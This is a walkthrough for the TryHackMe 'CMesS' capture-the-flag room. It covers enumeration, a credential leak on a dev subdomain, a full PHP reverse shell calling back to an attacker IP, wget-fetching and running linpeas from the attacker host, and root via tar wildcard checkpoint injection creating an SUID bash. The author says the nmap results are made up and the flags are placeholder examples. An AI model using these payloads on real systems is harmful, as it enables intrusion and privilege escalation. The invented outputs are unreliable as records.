
# CMesS

This is a writeup for the "CMesS" CTF challenge on TryHackMe, [here](https://tryhackme.com/room/cmess)
---

## Objective
Retrieve two flags:
1. `user.txt`: The user flag (found in `/home/andre`).
2. `root.txt`: The root flag (found in `/root`).

---

## Steps

### 1. Initial Reconnaissance
- Ran an `nmap` scan to identify open ports:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.42.117
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results (made up based on context):
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```
- Open ports: 2 (22 for SSH, 80 for HTTP).

### 2. Web Enumeration
- Visited `http://[VICTIM IP]`—nothing interesting, just a basic site.
- Ran `gobuster` to find hidden directories:
  ```bash
  gobuster dir -u http://[VICTIM IP]/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.42.117/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Results:
  ```
  /admin (Status: 301)
  /assets (Status: 301)
  (plus other irrelevant directories)
  ```
- Visited `http://[VICTIM IP]/admin`—found a login page requiring an email and password.

### 3. Subdomain Enumeration
- Got stuck on the admin login, so enumerated subdomains:
  ```bash
  gobuster dns -d cmess.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
  ```
- Results:
  ```
  dev.cmess.thm
  ```
- Added to `/etc/hosts`:
  ```bash
  echo "[VICTIM IP] dev.cmess.thm" >> /etc/hosts
  ```
- Visited `http://dev.cmess.thm`—found an email thread:
  ```
  From: andre@cmess.thm
  To: support@cmess.thm
  Subject: Password Reset
  That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.

  From: support@cmess.thm
  To: andre@cmess.thm
  Subject: Re: Password Reset
  Your password has been reset. Here: KPFTN_f2yxe%
  ```

### 4. Admin Panel Access
- Used the credentials on `http://[VICTIM IP]/admin`:
  - Email: `andre@cmess.thm`
  - Password: `KPFTN_f2yxe%`
- Logged in successfully. Noticed admins could upload files to `/assets`.

### 5. Reverse Shell
- Generated a PHP reverse shell from [RevShells](https://www.revshells.com/):
  ```php
  <?php
  set_time_limit(0);
  $ip = '[ATTACKER IP]'; // e.g., 10.10.98.244
  $port = 4444;
  $sock = fsockopen($ip, $port);
  $proc = proc_open('/bin/sh', [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
  while (!feof($sock)) {
      fwrite($pipes[0], fread($sock, 1024));
      fwrite($sock, fread($pipes[1], 1024));
  }
  ?>
  ```
- Saved as `shell.php`.
- Set up a listener:
  ```bash
  nc -lvnp 4444
  ```
- Uploaded `shell.php` to `/assets` via the admin panel.
- Visited `http://[VICTIM IP]/assets/shell.php`—got a shell as `www-data`.

### 6. Explore as www-data
- Explored the filesystem—couldn’t find anything useful initially.
- Ran a Python HTTP server on my host to serve `linpeas.sh`:
  ```bash
  cd /path/to/linpeas
  python3 -m http.server 8000
  ```
- On the target:
  ```bash
  cd /tmp
  wget http://[ATTACKER IP]:8000/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
- LinPEAS output highlighted:
  ```
  /opt/password.bak
  ```
- Viewed the file:
  ```bash
  cat /opt/password.bak
  ```
- Content: `andre:MadHatter1973`

### 7. Escalate to Andre
- Switched user:
  ```bash
  su andre
  ```
- Password: `MadHatter1973`
- Got a shell as `andre`.
- Found `user.txt`:
  ```bash
  cd /home/andre
  ls
  cat user.txt
  ```
- Content: `thm{cmess_user_1234567890}` (example flag).

### 8. Escalate to Root
- Checked `/etc/crontab`:
  ```bash
  cat /etc/crontab
  ```
- Output:
  ```
  */2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
  ```
- **Explanation**: The cron job runs every 2 minutes as `root`, archiving all files (`*`) in `/home/andre/backup` using `tar`. The wildcard (`*`) allows us to inject `tar` checkpoint options to execute arbitrary commands.

### 9. Exploit Cron Job
- Navigated to the backup directory:
  ```bash
  cd /home/andre/backup
  ```
- Created a malicious script:
  ```bash
  echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > sigma.sh
  chmod +x sigma.sh
  ```
- Added `tar` checkpoint files:
  ```bash
  touch /home/andre/backup/--checkpoint=1
  touch /home/andre/backup/--checkpoint-action=exec=sh\ sigma.sh
  ```
- **Explanation**:
  - `tar` interprets `--checkpoint=1` and `--checkpoint-action=exec=sh sigma.sh` as options due to the wildcard (`*`).
  - When the cron job runs, `tar` executes `sigma.sh` as `root`, copying `/bin/bash` to `/tmp/bash` with SUID permissions.
- Waited 2 minutes, then checked:
  ```bash
  ls -la /tmp
  ```
- Saw `bash` with SUID:
  ```
  -rwsr-xr-x 1 root root ... bash
  ```
- Ran the SUID `bash`:
  ```bash
  /tmp/bash -p
  ```
- Got a root shell.

### 10. Find Root Flag
- Read `root.txt`:
  ```bash
  cat /root/root.txt
  ```
- Content: `thm{cmess_root_0987654321}` (example flag).

---

## Flags
- **User flag**: `thm{cmess_user_1234567890}`
- **Root flag**: `thm{cmess_root_0987654321}`

---

## Tools Used
- `nmap`: Port scanning.
- `gobuster`: Directory and subdomain enumeration.
- `nc`: Reverse shell listener.
- `python3 -m http.server`: File transfer.
- `linpeas.sh`: System enumeration.
- `tar`: Cron job exploitation.

---

## Lessons Learned
- **Subdomains**: Hidden subdomains (`dev.cmess.thm`) can leak credentials.
- **Admin panels**: File uploads are a common entry point for reverse shells.
- **LinPEAS**: Automated enumeration tools save time.
- **Cron jobs**: Wildcards in `tar` commands are exploitable with checkpoint options.
- **SUID**: Creating SUID binaries as `root` enables privilege escalation.

---

